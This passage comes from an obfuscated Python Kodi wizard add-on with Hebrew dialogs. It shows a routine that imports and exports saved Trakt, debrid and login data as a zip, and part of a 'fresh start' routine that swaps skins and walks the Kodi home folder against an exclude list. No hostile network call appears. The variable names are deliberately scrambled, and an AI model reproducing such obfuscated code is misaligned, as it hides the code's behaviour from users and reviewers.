					else :os .remove (OOO0O0000000OO0O0 )#line:4473
				shutil .copy (O0OOO0O0OO0OOOOOO ,OOO0O0000000OO0O0 )#line:4474
			traktit .importlist ('all')#line:4475
			traktit .traktIt ('restore','all')#line:4476
		if os .path .exists (O00OO000O0O00OO0O ):#line:4477
			OOOO00O00O0OO0O0O +=1 #line:4478
			O00OOOOO0O0OOOO0O =os .listdir (O00OO000O0O00OO0O )#line:4479
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4480
			for OOOOO0O0O000O0O00 in O00OOOOO0O0OOOO0O :#line:4481
				OOO0O0000000OO0O0 =os .path .join (loginit .LOGINFOLD ,OOOOO0O0O000O0O00 )#line:4482
				O0OOO0O0OO0OOOOOO =os .path .join (O00OO000O0O00OO0O ,OOOOO0O0O000O0O00 )#line:4483
				if os .path .exists (OOO0O0000000OO0O0 ):#line:4484
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOOO0O0O000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4485
					else :os .remove (OOO0O0000000OO0O0 )#line:4486
				shutil .copy (O0OOO0O0OO0OOOOOO ,OOO0O0000000OO0O0 )#line:4487
			loginit .importlist ('all')#line:4488
			loginit .loginIt ('restore','all')#line:4489
		if os .path .exists (O0O00OO00O00OO00O ):#line:4490
			OOOO00O00O0OO0O0O +=1 #line:4491
			O00OOOOO0O0OOOO0O =os .listdir (O0O00OO00O00OO00O )#line:4492
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4493
			for OOOOO0O0O000O0O00 in O00OOOOO0O0OOOO0O :#line:4494
				OOO0O0000000OO0O0 =os .path .join (debridit .REALFOLD ,OOOOO0O0O000O0O00 )#line:4495
				O0OOO0O0OO0OOOOOO =os .path .join (O0O00OO00O00OO00O ,OOOOO0O0O000O0O00 )#line:4496
				if os .path .exists (OOO0O0000000OO0O0 ):#line:4497
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOOO0O0O000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4498
					else :os .remove (OOO0O0000000OO0O0 )#line:4499
				shutil .copy (O0OOO0O0OO0OOOOOO ,OOO0O0000000OO0O0 )#line:4500
			debridit .importlist ('all')#line:4501
			debridit .debridIt ('restore','all')#line:4502
		wiz .cleanHouse (OO00OO0OO0OOO0OOO )#line:4503
		wiz .removeFolder (OO00OO0OO0OOO0OOO )#line:4504
		os .remove (OOOOO000O00O0OO00 )#line:4505
		if OOOO00O00O0OO0O0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4506
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4507
	elif OOO000O0O00OO00O0 =='export':#line:4508
		OOO0OOO0OO0O000O0 =xbmc .translatePath (MYBUILDS )#line:4509
		O0O0O0O00O0O00000 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4510
		traktit .traktIt ('update','all')#line:4511
		loginit .loginIt ('update','all')#line:4512
		debridit .debridIt ('update','all')#line:4513
		OOO000OOOO0O00O0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4514
		OOO000OOOO0O00O0O =xbmc .translatePath (OOO000OOOO0O00O0O )#line:4515
		O0O0O00O00O00O000 =os .path .join (OOO0OOO0OO0O000O0 ,'SaveData.zip')#line:4516
		OOOO00OO0000000OO =zipfile .ZipFile (O0O0O00O00O00O000 ,mode ='w')#line:4517
		for O000O00O00O0O0OO0 in O0O0O0O00O0O00000 :#line:4518
			if os .path .exists (O000O00O00O0O0OO0 ):#line:4519
				O00OOOOO0O0OOOO0O =os .listdir (O000O00O00O0O0OO0 )#line:4520
				for O00O0O0000O00000O in O00OOOOO0O0OOOO0O :#line:4521
					OOOO00OO0000000OO .write (os .path .join (O000O00O00O0O0OO0 ,O00O0O0000O00000O ),os .path .join (O000O00O00O0O0OO0 ,O00O0O0000O00000O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4522
		OOOO00OO0000000OO .close ()#line:4523
		if OOO000OOOO0O00O0O ==OOO0OOO0OO0O000O0 :#line:4524
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00O00O00O000 ))#line:4525
		else :#line:4526
			try :#line:4527
				xbmcvfs .copy (O0O0O00O00O00O000 ,os .path .join (OOO000OOOO0O00O0O ,'SaveData.zip'))#line:4528
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOO000OOOO0O00O0O ,'SaveData.zip')))#line:4529
			except :#line:4530
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00O00O00O000 ))#line:4531
def freshStart (install =None ,over =False ):#line:4536
	if USERNAME =='':#line:4537
		ADDON .openSettings ()#line:4538
		sys .exit ()#line:4539
	OO000O00O0OO0O0O0 =u_list (SPEEDFILE )#line:4540
	(OO000O00O0OO0O0O0 )#line:4541
	O000OO00OOO00OO0O =(wiz .workingURL (OO000O00O0OO0O0O0 ))#line:4542
	(O000OO00OOO00OO0O )#line:4543
	if KEEPTRAKT =='true':#line:4544
		traktit .autoUpdate ('all')#line:4545
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4546
	if KEEPREAL =='true':#line:4547
		debridit .autoUpdate ('all')#line:4548
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4549
	if KEEPLOGIN =='true':#line:4550
		loginit .autoUpdate ('all')#line:4551
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4552
	if over ==True :O0O0O0OO0000O00O0 =1 #line:4553
	elif install =='restore':O0O0O0OO0000O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4554
	elif install :O0O0O0OO0000O00O0 =1 #line:4555
	else :O0O0O0OO0000O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4556
	if O0O0O0OO0000O00O0 :#line:4557
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4558
			O0O000O0O00OO0000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4559
			skinSwitch .swapSkins (O0O000O0O00OO0000 )#line:4562
			OO00OOOOO0O0OOO0O =0 #line:4563
			xbmc .sleep (1000 )#line:4564
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OOOOO0O0OOO0O <150 :#line:4565
				OO00OOOOO0O0OOO0O +=1 #line:4566
				xbmc .sleep (1000 )#line:4567
				wiz .ebi ('SendAction(Select)')#line:4568
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4569
				wiz .ebi ('SendClick(11)')#line:4570
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4571
			xbmc .sleep (1000 )#line:4572
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4573
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4574
			return #line:4575
		wiz .addonUpdates ('set')#line:4576
		O0OOO0000OOOOOO0O =os .path .abspath (HOME )#line:4577
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4578
		O000O00O00O0O0OOO =sum ([len (OOO0O0O0000O0O00O )for O0O00O0O00O0OOO0O ,O0O0O00O0OO000OO0 ,OOO0O0O0000O0O00O in os .walk (O0OOO0000OOOOOO0O )]);OOO00OO000OOOOOOO =0 #line:4579
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4580
		EXCLUDES .append ('My_Builds')#line:4581
		EXCLUDES .append ('archive_cache')#line:4582
		EXCLUDES .append ('script.module.requests')#line:4583
		EXCLUDES .append ('myfav.anon')#line:4584
		if KEEPREPOS =='true':#line:4585
			OOO0O0O00OO0OO000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4586
			for OO000000OOOOOO0O0 in OOO0O0O00OO0OO000 :#line:4587
				OO00OOO000O00OO0O =os .path .split (OO000000OOOOOO0O0 [:-1 ])[1 ]#line:4588
				if not OO00OOO000O00OO0O ==EXCLUDES :#line:4589
					EXCLUDES .append (OO00OOO000O00OO0O )#line:4590
		if KEEPSUPER =='true':#line:4591
			EXCLUDES .append ('plugin.program.super.favourites')#line:4592
		if KEEPMOVIELIST =='true':#line:4593
			EXCLUDES .append ('plugin.video.metalliq')#line:4594
		if KEEPMOVIELIST =='true':#line:4595
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4596
		if KEEPADDONS =='true':#line:4597
			EXCLUDES .append ('addons')#line:4598
		if KEEPADDONS =='true':#line:4599
			EXCLUDES .append ('addon_data')#line:4600
		EXCLUDES .append ('plugin.video.elementum')#line:4603
		EXCLUDES .append ('script.elementum.burst')#line:4604
		EXCLUDES .append ('script.elementum.burst-master')#line:4605
		EXCLUDES .append ('plugin.video.quasar')#line:4606
		EXCLUDES .append ('script.quasar.burst')#line:4607
		EXCLUDES .append ('skin.estuary')#line:4608
		if KEEPWHITELIST =='true':#line:4611
			OOO00O0OOOOOOO000 =''#line:4612
			O0O0O00OOOOO000OO =wiz .whiteList ('read')#line:4613
			if len (O0O0O00OOOOO000OO )>0 :#line:4614
				for OO000000OOOOOO0O0 in O0O0O00OOOOO000OO :#line:4615
					try :OOO0O000OOO0OOOOO ,OO0O000OO00O0OO00 ,OOOO00O0O0OOOO0OO =OO000000OOOOOO0O0 #line:4616
					except :pass #line:4617
					if OOOO00O0O0OOOO0OO .startswith ('pvr'):OOO00O0OOOOOOO000 =OO0O000OO00O0OO00 #line:4618
					OO00O000O0000O0OO =dependsList (OOOO00O0O0OOOO0OO )#line:4619
					for OOO00O00O00O00000 in OO00O000O0000O0OO :#line:4620
						if not OOO00O00O00O00000 in EXCLUDES :#line:4621
							EXCLUDES .append (OOO00O00O00O00000 )#line:4622
						OOO0O0O0OO0OOOO0O =dependsList (OOO00O00O00O00000 )#line:4623
						for O0OO0000OOOOOO000 in OOO0O0O0OO0OOOO0O :#line:4624
							if not O0OO0000OOOOOO000 in EXCLUDES :#line:4625
								EXCLUDES .append (O0OO0000OOOOOO000 )#line:4626
					if not OOOO00O0O0OOOO0OO in EXCLUDES :#line:4627
						EXCLUDES .append (OOOO00O0O0OOOO0OO )#line:4628
				if not OOO00O0OOOOOOO000 =='':wiz .setS ('pvrclient',OOOO00O0O0OOOO0OO )#line:4629
		if wiz .getS ('pvrclient')=='':#line:4630
			for OO000000OOOOOO0O0 in EXCLUDES :#line:4631
				if OO000000OOOOOO0O0 .startswith ('pvr'):#line:4632
					wiz .setS ('pvrclient',OO000000OOOOOO0O0 )#line:4633
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4634
		OOO0OO00OOO0OO000 =wiz .latestDB ('Addons')#line:4635
		for OOO0OOOO000OO0O0O ,O0O0O0OO0OOOO00O0 ,O0OOOO0O0O00OO0O0 in os .walk (O0OOO0000OOOOOO0O ,topdown =True ):#line:4636
			O0O0O0OO0OOOO00O0 [:]=[O0000O00O000OO0O0 for O0000O00O000OO0O0 in O0O0O0OO0OOOO00O0 if O0000O00O000OO0O0 not in EXCLUDES ]#line:4637
			for OOO0O000OOO0OOOOO in O0OOOO0O0O00OO0O0 :#line:4638
				OOO00OO000OOOOOOO +=1 #line:4639
				OOOO00O0O0OOOO0OO =OOO0OOOO000OO0O0O .replace ('/','\\').split ('\\')#line:4640
				OO00OOOOO0O0OOO0O =len (OOOO00O0O0OOOO0OO )-1 #line:4642
				if OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4643
				elif OOO0O000OOO0OOOOO =='MyVideos99.db'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4644
				elif OOO0O000OOO0OOOOO =='MyVideos107.db'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4645
				elif OOO0O000OOO0OOOOO =='MyVideos116.db'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4646
				elif OOO0O000OOO0OOOOO =='MyVideos99.db'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4647
				elif OOO0O000OOO0OOOOO =='MyVideos107.db'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4648
				elif OOO0O000OOO0OOOOO =='MyVideos116.db'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4649
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4650
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4651
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'skin.Premium.mod'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4652
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4653
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'skin.phenomenal'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4654
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4655
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'skin.titan'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4657
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4658
				elif OOO0O000OOO0OOOOO =='sources.xml'and OOOO00O0O0OOOO0OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4660
				elif OOO0O000OOO0OOOOO =='quicknav.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4663
				elif OOO0O000OOO0OOOOO =='x1101.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4664
				elif OOO0O000OOO0OOOOO =='b-srtym-b.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4665
				elif OOO0O000OOO0OOOOO =='x1102.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4666
				elif OOO0O000OOO0OOOOO =='b-sdrvt-b.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4667
				elif OOO0O000OOO0OOOOO =='x1112.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4668
				elif OOO0O000OOO0OOOOO =='b-tlvvyzyh-b.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4669
				elif OOO0O000OOO0OOOOO =='x1111.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4670
				elif OOO0O000OOO0OOOOO =='b-tvknyshrly-b.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4671
				elif OOO0O000OOO0OOOOO =='x1110.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4672
				elif OOO0O000OOO0OOOOO =='b-yldym-b.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4673
				elif OOO0O000OOO0OOOOO =='x1114.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4674
				elif OOO0O000OOO0OOOOO =='b-mvzyqh-b.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4675
				elif OOO0O000OOO0OOOOO =='mainmenu.DATA.xml'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4676
				elif OOO0O000OOO0OOOOO =='skin.Premium.mod.properties'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4677
				elif OOO0O000OOO0OOOOO =='favourites.xml'and OOOO00O0O0OOOO0OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4681
				elif OOO0O000OOO0OOOOO =='guisettings.xml'and OOOO00O0O0OOOO0OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4683
				elif OOO0O000OOO0OOOOO =='profiles.xml'and OOOO00O0O0OOOO0OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4684
